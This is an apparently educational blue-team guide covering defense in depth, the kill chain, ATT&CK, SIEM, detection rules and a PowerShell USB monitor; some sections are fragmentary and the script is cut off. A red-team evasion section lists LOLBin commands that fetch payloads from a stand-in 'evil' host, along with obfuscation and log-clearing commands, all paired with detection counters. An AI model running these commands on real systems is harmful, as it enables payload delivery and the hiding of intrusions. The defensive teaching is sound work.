# BLUE TEAM FUNDAMENTALS - COMPREHENSIVE SECURITY GUIDE

## Understanding the Blue Team Mindset

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ BLUE TEAM CORE PHILOSOPHY                                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ ┌─────────────────────────────────────────────────────────────────────────┐ │
│ │                                                                         │ │
│ │  "Defense is not about building walls. It's about seeing everything,   │ │
│ │   understanding everything, and responding to everything."             │ │
│ │                                                                         │ │
│ │  The Blue Team's job is to:                                            │ │
│ │  ┌─────────┐   ┌─────────┐   ┌─────────┐   ┌─────────┐   ┌─────────┐  │ │
│ │  │ PREVENT │ → │ DETECT  │ → │ ANALYZE │ → │ RESPOND │ → │ RECOVER │  │ │
│ │  └─────────┘   └─────────┘   └─────────┘   └─────────┘   └─────────┘  │ │
│ │                                                                         │ │
│ │  Key Principles:                                                        │ │
│ │  • Assume breach - act like attackers are already inside               │ │
│ │  • Defense in depth - multiple layers of protection                    │ │
│ │  • Least privilege - minimum access needed to function                 │ │
│ │  • Zero trust - verify everything, trust nothing                       │ │
│ │  • Continuous monitoring - never stop watching                         │ │
│ │                                                                         │ │
│ └─────────────────────────────────────────────────────────────────────────┘ │
│                                                                              │
│ RED TEAM vs BLUE TEAM vs PURPLE TEAM:                                        │
│ ┌─────────────────────────────────────────────────────────────────────────┐ │
│ │                                                                         │ │
│ │  ┌─────────────┐         ┌─────────────┐         ┌─────────────┐       │ │
│ │  │  RED TEAM   │         │ PURPLE TEAM │         │  BLUE TEAM  │       │ │
│ │  │  (Offense)  │ ←─────→ │(Collaboration)←─────→ │  (Defense)  │       │ │
│ │  └─────────────┘         └─────────────┘         └─────────────┘       │ │
│ │        │                       │                       │               │ │
│ │        ▼                       ▼                       ▼               │ │
│ │  • Penetration testing   • Knowledge sharing     • Monitoring          │ │
│ │  • Vulnerability finding • Joint exercises       • Detection           │ │
│ │  • Attack simulation     • Improve defenses      • Incident Response   │ │
│ │  • Exploit development   • Validate controls     • Threat Hunting      │ │
│ │                                                                         │ │
│ └─────────────────────────────────────────────────────────────────────────┘ │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Defense in Depth - The Layered Security Model

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ DEFENSE IN DEPTH - LAYERED SECURITY MODEL                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ CONCEPTUAL EXPLANATION:                                                      │
│ ───────────────────────                                                      │
│ Defense in depth means having multiple layers of security controls.         │
│ If one layer fails, others are still in place to protect assets.            │
│ Think of it like a castle: walls, moat, guards, locked doors, etc.          │
│                                                                              │
│ THE SECURITY LAYERS:                                                         │
│                                                                              │
│    ┌─────────────────────────────────────────────────────────────────────┐  │
│    │                        LAYER 7: DATA                                │  │
│    │   Encryption, DLP, Classification, Access Controls                  │  │
│    ├─────────────────────────────────────────────────────────────────────┤  │
│    │                     LAYER 6: APPLICATION                            │  │
│    │   WAF, Input Validation, Secure Coding, Application Whitelisting    │  │
│    ├─────────────────────────────────────────────────────────────────────┤  │
│    │                        LAYER 5: HOST                                │  │
│    │   EDR, AV, Host Firewall, Patch Management, Hardening               │  │
│    ├─────────────────────────────────────────────────────────────────────┤  │
│    │                    LAYER 4: INTERNAL NETWORK                        │  │
│    │   Segmentation, VLAN, Internal IDS/IPS, Network Access Control      │  │
│    ├─────────────────────────────────────────────────────────────────────┤  │
│    │                      LAYER 3: PERIMETER                             │  │
│    │   Firewall, DMZ, VPN, Proxy, Email Gateway                          │  │
│    ├─────────────────────────────────────────────────────────────────────┤  │
│    │                       LAYER 2: PHYSICAL                             │  │
│    │   Guards, Cameras, Locks, Badge Access, USB Blocking                │  │
│    ├─────────────────────────────────────────────────────────────────────┤  │
│    │                   LAYER 1: POLICIES & AWARENESS                     │  │
│    │   Security Policies, Training, Acceptable Use, Incident Procedures  │  │
│    └─────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
│ WHY EACH LAYER MATTERS:                                                      │
│                                                                              │
│ Layer 1 - Policies & Awareness:                                              │
│   • Users are often the weakest link                                         │
│   • Training prevents social engineering and phishing                        │
│   • Clear policies define acceptable behavior                                │
│   • Without policies, there's no baseline for enforcement                    │
│                                                                              │
│ Layer 2 - Physical Security:                                                 │
│   • BadUSB attacks require physical access                                   │
│   • Tailgating allows attackers inside                                       │
│   • Unattended workstations are targets                                      │
│   • Physical access often means full compromise                              │
│                                                                              │
│ Layer 3 - Perimeter:                                                         │
│   • First line of defense from external threats                              │
│   • Filters malicious traffic before it enters                               │
│   • VPN secures remote access                                                │
│   • Email gateway blocks phishing attempts                                   │
│                                                                              │
│ Layer 4 - Internal Network:                                                  │
│   • Limits lateral movement after initial breach                             │
│   • Segmentation contains damage                                             │
│   • Internal IDS catches insider threats                                     │
│   • Zero trust verifies all internal traffic                                 │
│                                                                              │
│ Layer 5 - Host:                                                              │
│   • EDR detects malicious behavior on endpoints                              │
│   • Patching closes known vulnerabilities                                    │
│   • Host firewall limits incoming connections                                │
│   • Hardening removes unnecessary attack surface                             │
│                                                                              │
│ Layer 6 - Application:                                                       │
│   • WAF protects web applications                                            │
│   • Input validation prevents injection attacks                              │
│   • Application whitelisting blocks unauthorized software                    │
│   • Secure coding prevents vulnerabilities at source                         │
│                                                                              │
│ Layer 7 - Data:                                                              │
│   • Encryption protects data even if other layers fail                       │
│   • DLP prevents data exfiltration                                           │
│   • Classification prioritizes protection                                    │
│   • Access controls limit who can see what                                   │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## The Kill Chain Model for Defenders

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ THE CYBER KILL CHAIN - DEFENDER'S PERSPECTIVE                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ WHAT IS THE KILL CHAIN?                                                      │
│ ───────────────────────                                                      │
│ The Cyber Kill Chain (Lockheed Martin) describes the stages of a            │
│ cyber attack. As defenders, understanding each stage helps us know          │
│ WHERE and WHEN to detect and stop attacks.                                   │
│                                                                              │
│ KILL CHAIN STAGES AND DEFENSE OPPORTUNITIES:                                 │
│                                                                              │
│ ┌──────────────────────────────────────────────────────────────────────────┐│
│ │ STAGE              │ ATTACKER DOES           │ DEFENDER CAN              ││
│ ├────────────────────┼─────────────────────────┼───────────────────────────┤│
│ │ 1. RECONNAISSANCE  │ Research targets        │ Monitor for scanning      ││
│ │                    │ Scan for vulnerabilities│ OSINT awareness           ││
│ │                    │ Gather OSINT            │ Limit public info         ││
│ ├────────────────────┼─────────────────────────┼───────────────────────────┤│
│ │ 2. WEAPONIZATION   │ Create malware          │ (Attacker-side, limited   ││
│ │                    │ Prepare payloads        │  visibility for defender) ││
│ │                    │ Package exploits        │ Threat intelligence       ││
│ ├────────────────────┼─────────────────────────┼───────────────────────────┤│
│ │ 3. DELIVERY        │ Send phishing email     │ Email gateway filtering   ││
│ │                    │ USB drop attack         │ USB device control        ││
│ │                    │ Compromised website     │ Web proxy filtering       ││
│ ├────────────────────┼─────────────────────────┼───────────────────────────┤│
│ │ 4. EXPLOITATION    │ Exploit vulnerability   │ Patch management          ││
│ │                    │ User opens malware      │ Application whitelisting  ││
│ │                    │ Execute payload         │ EDR behavioral detection  ││
│ ├────────────────────┼─────────────────────────┼───────────────────────────┤│
│ │ 5. INSTALLATION    │ Install backdoor        │ EDR/AV detection          ││
│ │                    │ Establish persistence   │ File integrity monitoring ││
│ │                    │ Create scheduled tasks  │ Registry monitoring       ││
│ ├────────────────────┼─────────────────────────┼───────────────────────────┤│
│ │ 6. C2 (COMMAND &   │ Connect to C2 server    │ Network monitoring        ││
│ │    CONTROL)        │ Receive instructions    │ DNS analysis              ││
│ │                    │ Exfil staging           │ Egress filtering          ││
│ ├────────────────────┼─────────────────────────┼───────────────────────────┤│
│ │ 7. ACTIONS ON      │ Steal data              │ DLP solutions             ││
│ │    OBJECTIVES      │ Encrypt files           │ User behavior analytics   ││
│ │                    │ Lateral movement        │ Rapid incident response   ││
│ └────────────────────┴─────────────────────────┴───────────────────────────┘│
│                                                                              │
│ KEY INSIGHT FOR DEFENDERS:                                                   │
│ ──────────────────────────                                                   │
│ The earlier you detect an attack, the less damage occurs.                    │
│ But even late detection allows for damage containment and recovery.          │
│                                                                              │
│ BADUSB ATTACKS IN THE KILL CHAIN:                                            │
│ ──────────────────────────────────                                           │
│ • Delivery: Physical USB insertion (bypasses network perimeter)              │
│ • Exploitation: Keyboard emulation (bypasses application controls)           │
│ • Installation: Payload creates persistence (must be detected here!)         │
│ • C2: Payload connects back (network monitoring critical)                    │
│                                                                              │
│ This is why USB device control and behavioral detection are essential        │
│ for defending against BadUSB attacks like Flipper Zero payloads.             │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## MITRE ATT&CK Framework for Defenders

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ MITRE ATT&CK FRAMEWORK - DEFENDER'S GUIDE                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ WHAT IS MITRE ATT&CK?                                                        │
│ ─────────────────────                                                        │
│ MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is     │
│ a globally-accessible knowledge base of adversary tactics and techniques    │
│ based on real-world observations. It's the "common language" of security.   │
│                                                                              │
│ Website: https://attack.mitre.org                                            │
│                                                                              │
│ STRUCTURE OF ATT&CK:                                                         │
│ ─────────────────────                                                        │
│ • TACTICS: The "why" - the adversary's goal (14 tactics)                     │
│ • TECHNIQUES: The "how" - methods to achieve the goal                        │
│ • SUB-TECHNIQUES: More specific implementations of techniques                │
│ • PROCEDURES: Specific ways adversaries implement techniques                 │
│                                                                              │
│ THE 14 ATT&CK TACTICS (Enterprise Matrix):                                   │
│ ┌────────────────────────────────────────────────────────────────────────┐  │
│ │ TACTIC             │ ID    │ DESCRIPTION                               │  │
│ ├────────────────────┼───────┼───────────────────────────────────────────┤  │
│ │ Reconnaissance     │ TA0043│ Gathering info to plan future operations  │  │
│ │ Resource Dev.      │ TA0042│ Establishing resources for operations     │  │
│ │ Initial Access     │ TA0001│ Getting into the network                  │  │
│ │ Execution          │ TA0002│ Running malicious code                    │  │
│ │ Persistence        │ TA0003│ Maintaining foothold                      │  │
│ │ Privilege Escalation│TA0004│ Gaining higher-level permissions          │  │
│ │ Defense Evasion    │ TA0005│ Avoiding detection                        │  │
│ │ Credential Access  │ TA0006│ Stealing account names and passwords      │  │
│ │ Discovery          │ TA0007│ Figuring out the environment              │  │
│ │ Lateral Movement   │ TA0008│ Moving through the environment            │  │
│ │ Collection         │ TA0009│ Gathering data of interest                │  │
│ │ Command & Control  │ TA0011│ Communicating with compromised systems    │  │
│ │ Exfiltration       │ TA0010│ Stealing data                             │  │
│ │ Impact             │ TA0040│ Manipulating, interrupting, destroying    │  │
│ └────────────────────┴───────┴───────────────────────────────────────────┘  │
│                                                                              │
│ BADUSB-RELATED ATT&CK TECHNIQUES:                                            │
│ ──────────────────────────────────                                           │
│ • T1091 - Replication Through Removable Media                                │
│ • T1059 - Command and Scripting Interpreter                                  │
│   ├── T1059.001 - PowerShell                                                 │
│   ├── T1059.003 - Windows Command Shell                                      │
│   └── T1059.004 - Bash                                                       │
│ • T1547 - Boot or Logon Autostart Execution                                  │
│   ├── T1547.001 - Registry Run Keys                                          │
│   └── T1547.004 - Winlogon Helper DLL                                        │
│ • T1053 - Scheduled Task/Job                                                 │
│ • T1546 - Event Triggered Execution                                          │
│ • T1071 - Application Layer Protocol (C2)                                    │
│ • T1041 - Exfiltration Over C2 Channel                                       │
│                                                                              │
│ HOW DEFENDERS USE ATT&CK:                                                    │
│ ──────────────────────────                                                   │
│ 1. Map detection capabilities to techniques                                  │
│ 2. Identify coverage gaps                                                    │
│ 3. Prioritize security improvements                                          │
│ 4. Create detection rules using technique IDs                                │
│ 5. Communicate threats using common language                                 │
│ 6. Measure security maturity                                                 │
│                                                                              │
│ ATT&CK NAVIGATOR:                                                            │
│ ──────────────────                                                           │
│ Visual tool to map your detection coverage:                                  │
│ https://mitre-attack.github.io/attack-navigator/                             │
│                                                                              │
│ Example: Map your detection capabilities, color-code them by:                │
│ • Green: Full detection coverage                                             │
│ • Yellow: Partial detection                                                  │
│ • Red: No detection (gap to address)                                         │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Security Metrics and KPIs

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ SECURITY METRICS AND KEY PERFORMANCE INDICATORS (KPIs)                       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ WHY METRICS MATTER:                                                          │
│ ───────────────────                                                          │
│ "You can't improve what you can't measure." Metrics help:                    │
│ • Demonstrate security value to leadership                                   │
│ • Identify areas needing improvement                                         │
│ • Track progress over time                                                   │
│ • Prioritize resource allocation                                             │
│                                                                              │
│ ESSENTIAL BLUE TEAM METRICS:                                                 │
│                                                                              │
│ ┌─────────────────────────────────────────────────────────────────────────┐ │
│ │ DETECTION METRICS                                                       │ │
│ ├─────────────────────────────────────────────────────────────────────────┤ │
│ │ MTTD (Mean Time to Detect)                                              │ │
│ │   • How long from compromise to detection?                              │ │
│ │   • Industry average: 197 days (bad!)                                   │ │
│ │   • Target: < 24 hours                                                  │ │
│ │                                                                         │ │
│ │ Detection Rate                                                          │ │
│ │   • % of attacks detected vs. total attacks                             │ │
│ │   • Measured through red team exercises                                 │ │
│ │   • Target: > 90%                                                       │ │
│ │                                                                         │ │
│ │ False Positive Rate                                                     │ │
│ │   • % of alerts that are not true threats                               │ │
│ │   • High FP = alert fatigue = missed real threats                       │ │
│ │   • Target: < 10%                                                       │ │
│ └─────────────────────────────────────────────────────────────────────────┘ │
│                                                                              │
│ ┌─────────────────────────────────────────────────────────────────────────┐ │
│ │ RESPONSE METRICS                                                        │ │
│ ├─────────────────────────────────────────────────────────────────────────┤ │
│ │ MTTR (Mean Time to Respond)                                             │ │
│ │   • How long from detection to containment?                             │ │
│ │   • Target: < 4 hours for critical incidents                            │ │
│ │                                                                         │ │
│ │ MTTC (Mean Time to Contain)                                             │ │
│ │   • How long to stop attack spread?                                     │ │
│ │   • Measures containment effectiveness                                  │ │
│ │                                                                         │ │
│ │ MTTR (Mean Time to Recover)                                             │ │
│ │   • How long to return to normal operations?                            │ │
│ │   • Includes eradication and recovery                                   │ │
│ └─────────────────────────────────────────────────────────────────────────┘ │
│                                                                              │
│ ┌─────────────────────────────────────────────────────────────────────────┐ │
│ │ VULNERABILITY METRICS                                                   │ │
│ ├─────────────────────────────────────────────────────────────────────────┤ │
│ │ Patch Latency                                                           │ │
│ │   • Time from patch release to deployment                               │ │
│ │   • Critical: < 7 days, High: < 14 days, Medium: < 30 days              │ │
│ │                                                                         │ │
│ │ Vulnerability Density                                                   │ │
│ │   • Vulnerabilities per asset                                           │ │
│ │   • Trends matter more than absolute numbers                            │ │
│ │                                                                         │ │
│ │ Scanning Coverage                                                       │ │
│ │   • % of assets regularly scanned                                       │ │
│ │   • Target: 100%                                                        │ │
│ └─────────────────────────────────────────────────────────────────────────┘ │
│                                                                              │
│ ┌─────────────────────────────────────────────────────────────────────────┐ │
│ │ OPERATIONAL METRICS                                                     │ │
│ ├─────────────────────────────────────────────────────────────────────────┤ │
│ │ Alert Volume                                                            │ │
│ │   • Alerts per day/week                                                 │ │
│ │   • Trend analysis for anomalies                                        │ │
│ │                                                                         │ │
│ │ SOC Analyst Workload                                                    │ │
│ │   • Alerts per analyst                                                  │ │
│ │   • Time spent on each alert                                            │ │
│ │                                                                         │ │
│ │ Automation Rate                                                         │ │
│ │   • % of incidents auto-resolved                                        │ │
│ │   • Reduces analyst burden                                              │ │
│ └─────────────────────────────────────────────────────────────────────────┘ │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

# SECURITY MONITORING & SIEM - COMPREHENSIVE GUIDE

## Understanding Security Monitoring

```

│                                                                              │

│    │             │     │             │     │             │                  │
│    │ • Endpoints │     │ • Agents    │     │ • SIEM      │                  │
│    │ • Network   │     │ • Syslog    │     │ • ML/AI     │                  │
│    │ • Cloud     │     │ • APIs      │     │ • Rules     │                  │
│    │ • Apps      │     │ • Beats     │     │ • Analysts  │                  │
│    └─────────────┘     └─────────────┘     └─────────────┘                  │
│           │                                       │                          │
│           │         ┌─────────────┐               │                          │
│           │         │   STORAGE   │◀──────────────┘                          │
│           │         │             │                                          │
│           │         │ • Data Lake │                                          │
│           │         │ • Hot/Cold  │                                          │
│           │         │ • Retention │                                          │
│           │         └─────────────┘                                          │
│           │                │                                                 │
│           ▼                ▼                                                 │
│    ┌─────────────────────────────────────────────┐                          │
│    │              ALERTING & RESPONSE             │                          │
│    │                                              │                          │
│    │  • Real-time alerts    • Playbooks          │                          │
│    │  • Dashboards          • SOAR integration   │                          │
│    │  • Notifications       • Ticket creation    │                          │
│    └─────────────────────────────────────────────┘                          │
│                                                                              │
│ WHY MONITORING MATTERS:                                                      │

│ • Faster detection = less damage                                             │

## SIEM - Security Information and Event Management

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ SIEM - SECURITY INFORMATION AND EVENT MANAGEMENT                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ WHAT IS A SIEM?                                                              │
│ ───────────────                                                              │
│ A SIEM aggregates logs from all sources, correlates events, and provides    │
│ real-time analysis and alerting. It's the central nervous system of         │
│ security operations.                                                         │
│                                                                              │
│ SIEM CORE FUNCTIONS:                                                         │
│ ┌───────────────────────────────────────────────────────────────────────┐   │
│ │                                                                       │   │
│ │  1. LOG COLLECTION        2. NORMALIZATION       3. CORRELATION       │   │
│ │  ┌─────────────────┐     ┌─────────────────┐    ┌─────────────────┐  │   │
│ │  │ Collect logs    │     │ Parse different │    │ Connect related │  │   │
│ │  │ from everywhere │ ──▶ │ log formats to  │ ──▶│ events across   │  │   │
│ │  │                 │     │ common schema   │    │ sources         │  │   │
│ │  └─────────────────┘     └─────────────────┘    └─────────────────┘  │   │
│ │          │                                              │             │   │
│ │          ▼                                              ▼             │   │
│ │  4. DETECTION             5. ALERTING           6. INVESTIGATION     │   │
│ │  ┌─────────────────┐     ┌─────────────────┐    ┌─────────────────┐  │   │
│ │  │ Apply detection │     │ Trigger alerts  │    │ Search & pivot  │  │   │
│ │  │ rules and ML    │ ──▶ │ when threats    │ ──▶│ across data for │  │   │
│ │  │ models          │     │ are detected    │    │ context         │  │   │

## Red Team Perspective: Evading Detection

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ RED TEAM: UNDERSTANDING DETECTION TO TEST DEFENSES                           │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ DISCLAIMER:                                                                  │
│ ───────────                                                                  │
│ This section is for authorized security testing and understanding how       │
│ attackers think. Blue teams MUST understand attacker techniques to          │
│ effectively defend against them.                                             │
│                                                                              │
│ WHAT ATTACKERS TRY TO AVOID:                                                 │
│ ─────────────────────────────                                                │
│ 1. Process creation with suspicious command lines                            │
│ 2. Network connections to unknown destinations                               │
│ 3. Registry modifications in autostart locations                             │
│ 4. Accessing sensitive processes (LSASS)                                     │
│ 5. Creating scheduled tasks or services                                      │
│ 6. Spawning child processes from unusual parents                             │
│                                                                              │
│ COMMON EVASION TECHNIQUES (FOR UNDERSTANDING):                               │
│                                                                              │
│ 1. LIVING OFF THE LAND (LOLBins):                                            │
│ ───────────────────────────────────                                          │
│ Using legitimate Windows binaries for malicious purposes.                    │
│ These blend in with normal activity.                                         │
│                                                                              │
│ Examples:                                                                    │
│ • certutil.exe -urlcache -f http://evil/payload.exe                          │
│ • mshta.exe http://evil/payload.hta                                          │
│ • rundll32.exe javascript:"\...\mshtml.dll,RunHTMLApplication..."            │
│ • regsvr32.exe /u /n /s /i:http://evil/script.sct scrobj.dll                 │
│                                                                              │
│ BLUE TEAM COUNTER:                                                           │
│ Create detection rules for unusual LOLBin usage:                             │
│ • certutil with -urlcache                                                    │
│ • mshta accessing network resources                                          │
│ • regsvr32 with /i:http                                                      │
│                                                                              │
│ 2. OBFUSCATION:                                                              │
│ ────────────────                                                             │
│ Attackers encode/obfuscate commands to avoid string-based detection.         │
│                                                                              │
│ Examples:                                                                    │
│ • Base64 encoding: powershell -enc <base64>                                  │
│ • String concatenation: p"o"w"e"r"s"h"e"l"l                                  │
│ • Character codes: [char]73+[char]69+[char]88 = "IEX"                        │
│ • Environment variable abuse: %comspec% /c command                           │
│                                                                              │
│ BLUE TEAM COUNTER:                                                           │
│ • Enable PowerShell Script Block Logging (sees decoded commands)             │
│ • Alert on -enc or -encodedcommand parameters                                │
│ • Use AMSI (Anti-Malware Scan Interface) integration                         │
│                                                                              │
│ 3. PARENT PROCESS SPOOFING:                                                  │
│ ────────────────────────────                                                 │
│ Making malicious processes appear to spawn from legitimate parents.          │
│                                                                              │
│ Normal: explorer.exe → chrome.exe (user opened browser)                      │
│ Suspicious: winword.exe → powershell.exe (macro execution)                   │
│ Spoofed: explorer.exe → malware.exe (looks legitimate)                       │
│                                                                              │
│ BLUE TEAM COUNTER:                                                           │
│ • Monitor for PPID spoofing indicators                                       │
│ • Correlate process creation with Sysmon Event ID 1                          │
│ • Look for mismatches in parent-child relationships                          │
│                                                                              │
│ 4. TIMING-BASED EVASION:                                                     │
│ ─────────────────────────                                                    │
│ Executing during off-hours or spacing out activities.                        │
│                                                                              │
│ BLUE TEAM COUNTER:                                                           │
│ • User behavior analytics (UBA)                                              │
│ • Alert on activity during unusual hours                                     │
│ • Baseline normal user activity patterns                                     │
│                                                                              │
│ 5. LOG EVASION:                                                              │
│ ────────────────                                                             │
│ Attackers may try to:                                                        │
│ • Clear event logs: wevtutil cl Security                                     │
│ • Stop logging services: Stop-Service -Name "Windows Event Log"              │
│ • Disable Sysmon: fltMC unload SysmonDrv                                     │
│ • Patch ETW (Event Tracing for Windows)                                      │
│                                                                              │
│ BLUE TEAM COUNTER:                                                           │
│ • Alert on event log clearing (Event ID 1102)                                │
│ • Monitor for Sysmon service changes (Sysmon Event ID 4)                     │
│ • Forward logs to SIEM in real-time (can't delete what's sent)               │
│ • Protected process light for critical services                              │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Detection Rules and Queries

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ DETECTION RULES - PRACTICAL EXAMPLES                                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ SIGMA RULES:                                                                 │
│ ────────────                                                                 │
│ Sigma is a generic signature format for SIEM systems. Write once,           │
│ convert to any SIEM query language.                                          │
│                                                                              │
│ Website: https://github.com/SigmaHQ/sigma                                    │
│                                                                              │
│ EXAMPLE: Detect BadUSB Payload Execution                                     │
│ ─────────────────────────────────────────                                    │
│                                                                              │
│ title: Suspicious PowerShell Execution from CMD                              │
│ description: Detects PowerShell spawned from CMD with suspicious flags       │
│ status: experimental                                                         │
│ author: Security Team                                                        │
│ references:                                                                  │
│   - https://attack.mitre.org/techniques/T1059/001/                           │
│ logsource:                                                                   │
│   category: process_creation                                                 │
│   product: windows                                                           │
│ detection:                                                                   │
│   selection:                                                                 │
│     ParentImage|endswith: '\cmd.exe'                                         │
│     Image|endswith: '\powershell.exe'                                        │
│     CommandLine|contains:                                                    │
│       - '-w hidden'                                                          │
│       - '-windowstyle hidden'                                                │
│       - '-ep bypass'                                                         │
│       - '-executionpolicy bypass'                                            │
│       - '-enc'                                                               │
│       - '-encodedcommand'                                                    │
│       - 'IEX'                                                                │
│       - 'Invoke-Expression'                                                  │
│   condition: selection                                                       │
│ falsepositives:                                                              │
│   - Administrative scripts (whitelist known paths)                           │
│ level: high                                                                  │
│ tags:                                                                        │
│   - attack.execution                                                         │
│   - attack.t1059.001                                                         │
│                                                                              │
│                                                                              │
│ SPLUNK SPL QUERIES:                                                          │
│ ────────────────────                                                         │
│                                                                              │
│ # Detect BadUSB PowerShell Execution                                         │
│ index=windows EventCode=4688 OR EventCode=1                                  │
│ | where like(NewProcessName, "%powershell.exe")                              │
│ | where like(CommandLine, "%-w hidden%") OR                                  │
│         like(CommandLine, "%-ep bypass%") OR                                 │
│         like(CommandLine, "%-enc%")                                          │
│ | table _time, ComputerName, User, ParentProcessName, CommandLine            │
│                                                                              │
│ # Detect New USB HID Device                                                  │
│ index=windows source="WinEventLog:Microsoft-Windows-DriverFrameworks*"       │
│ | search "USB\\VID" "HID"                                                    │
│ | table _time, ComputerName, Message                                         │
│                                                                              │
│ # Detect Registry Persistence                                                │
│ index=windows (EventCode=13 OR EventCode=12)                                 │
│ TargetObject="*\\CurrentVersion\\Run*"                                       │
│ | table _time, ComputerName, User, TargetObject, Details                     │
│                                                                              │
│ # Detect Rapid Keystroke Injection (BadUSB Indicator)                        │
│ index=windows EventCode=4688                                                 │
│ | bin _time span=5s                                                          │
│ | stats count by _time, ComputerName                                         │
│ | where count > 20                                                           │
│ | table _time, ComputerName, count                                           │
│                                                                              │
│                                                                              │
│ ELASTIC/KIBANA KQL QUERIES:                                                  │
│ ────────────────────────────                                                 │
│                                                                              │
│ # Detect Suspicious PowerShell                                               │
│ process.name: "powershell.exe" and                                           │
│ process.command_line: (*-w\ hidden* or *-ep\ bypass* or *-enc*)              │
│                                                                              │
│ # Detect USB Device Connection                                               │
│ event.code: "20001" and winlog.provider_name: "Microsoft-Windows-UserPnp"    │
│                                                                              │
│ # Detect Registry Run Key Modification                                       │
│ event.code: 13 and registry.path: *CurrentVersion\\Run*                      │
│                                                                              │
│                                                                              │
│ MICROSOFT SENTINEL KQL:                                                      │
│ ─────────────────────────                                                    │
│                                                                              │
│ // Detect BadUSB Indicators                                                  │
│ SecurityEvent                                                                │
│ | where EventID == 4688                                                      │
│ | where NewProcessName endswith "powershell.exe"                             │
│ | where CommandLine contains "-w hidden" or                                  │
│         CommandLine contains "-ep bypass" or                                 │
│         CommandLine contains "-enc"                                          │
│ | project TimeGenerated, Computer, Account, CommandLine, ParentProcessName   │
│                                                                              │
│ // Detect Multiple Rapid Commands (Keystroke Injection)                      │
│ SecurityEvent                                                                │
│ | where EventID == 4688                                                      │
│ | summarize CommandCount = count() by Computer, bin(TimeGenerated, 10s)      │
│ | where CommandCount > 10                                                    │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### PowerShell: Real-Time USB Device Monitor

```powershell
# =====================================================
# USB DEVICE MONITORING SCRIPT
# Purpose: Monitor for new USB device connections
# Deploy: Run as scheduled task at startup
# =====================================================

# Configuration
$LogPath = "C:\SecurityLogs\USBMonitor.log"
$AlertWebhook = "https://your-webhook-url"  # Optional: Teams/Slack webhook

# Create log directory
$LogDir = Split-Path $LogPath
if (-not (Test-Path $LogDir)) {
    New-Item -ItemType Directory -Path $LogDir -Force | Out-Null
}

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogEntry = "[$Timestamp] [$Level] $Message"
    Add-Content -Path $LogPath -Value $LogEntry
    Write-Host $LogEntry
}

function Send-Alert {
    param([string]$Title, [string]$Message)
    if ($AlertWebhook) {
        $Body = @{
            title = $Title
            text = $Message
        } | ConvertTo-Json
        try {
            Invoke-RestMethod -Uri $AlertWebhook -Method Post -Body $Body -ContentType 'application/json'
        } catch {
            Write-Log "Failed to send alert: $_" "ERROR"
        }
    }
}

function Get-USBDeviceDetails {
    param([string]$DeviceID)

    $Device = Get-PnpDevice -InstanceId $DeviceID -ErrorAction SilentlyContinue
    if ($Device) {
        return @{
            Name = $Device.FriendlyName
            Class = $Device.Class
            Manufacturer = $Device.Manufacturer
            Status = $Device.Status
        }
    }
    return $null
}

Write-Log "USB Monitor started" "INFO"

# Known safe device IDs (customize for your environment)
$SafeDevices = @(
    "VID_046D",  # Logitech
    "VID_045E",  # Microsoft
    "VID_04F2"   # Chicony (common keyboard/mouse)
)

# Monitor for USB device events
$Query = @"
SELECT * FROM __InstanceCreationEvent
WITHIN 1
WHERE TargetInstance ISA 'Win32_PnPEntity'
AND TargetInstance.DeviceID LIKE 'USB%'
"@

Write-Log "Registering WMI event listener..." "INFO"

Register-WmiEvent -Query $Query -SourceIdentifier "USBMonitor" -Action {
    $Device = $Event.SourceEventArgs.NewEvent.TargetInstance
    $DeviceID = $Device.DeviceID
    $DeviceName = $Device.Name
    $Description = $Device.Description

    # Check if it's a HID device (keyboard/mouse)
    $IsHID = $DeviceID -match "HID" -or $Description -match "HID|Keyboard|Input"

    # Check if it's a known safe device
    $IsSafe = $false
    foreach ($Safe in $SafeDevices) {
        if ($DeviceID -match $Safe) {
            $IsSafe = $true
            break
        }
    }

    $LogMessage = "USB Device Connected: $DeviceName | ID: $DeviceID | HID: $IsHID"

    if ($IsHID -and -not $IsSafe) {
        # Potential BadUSB - High Alert
        $AlertLevel = "CRITICAL"
        $LogMessage = "[POTENTIAL BADUSB] $LogMessage"

        # Get more details
        $User = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $AlertMessage = @"
POTENTIAL BADUSB DETECTED!

Device: $DeviceName
Device ID: $DeviceID
Computer: $env:COMPUTERNAME
User: $User
Time: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")

ACTION REQUIRED: Investigate this USB device immediately.
"@

        # Log to Windows Event Log
        Write-EventLog -LogName Application -Source "USB Monitor" -EventId 9001 -EntryType Warning -Message $AlertMessage

        # Send webhook alert
        Send-Alert -Title "POTENTIAL BADUSB DETECTED" -Message $AlertMessage

    } elseif ($IsHID) {
        $AlertLevel = "INFO"
    } else {
        $AlertLevel = "INFO"
    }

    Write-Log $LogMessage $AlertLevel
}

Write-Log "USB Monitor is running. Press Ctrl+C to stop." "INFO"

# Keep script running
try {
    while ($true) {
        Start-Sleep -Seconds 60
        Write-Log "USB Monitor heartbeat - still running" "DEBUG"
    }
} finally {
